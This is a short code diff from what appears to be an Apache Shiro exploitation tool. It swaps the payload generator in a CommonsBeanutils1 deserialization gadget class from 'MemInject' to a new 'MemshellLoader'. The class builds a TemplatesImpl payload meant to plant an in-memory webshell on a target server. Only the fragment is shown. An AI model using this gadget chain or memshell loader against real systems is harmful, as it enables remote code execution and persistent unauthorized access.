@@ -1,6 +1,7 @@
 package com.y5neko.shiroexp.gadget;
 
 import com.y5neko.shiroexp.echo.*;
+import com.y5neko.shiroexp.payloads.MemshellLoader;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.y5neko.shiroexp.misc.Tools;
@@ -157,8 +158,8 @@ public class CommonsBeanutils1 {
         CtClass ctClass;
         CtClass superClass;
 
-        MemInject memInject = new MemInject();
-        ctClass = memInject.genPayload(pool);
+        MemshellLoader memshellLoader = new MemshellLoader();
+        ctClass = memshellLoader.genPayload(pool);
 
         // 判断是否存在properXalan属性，然后选择AbstractTranslet
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
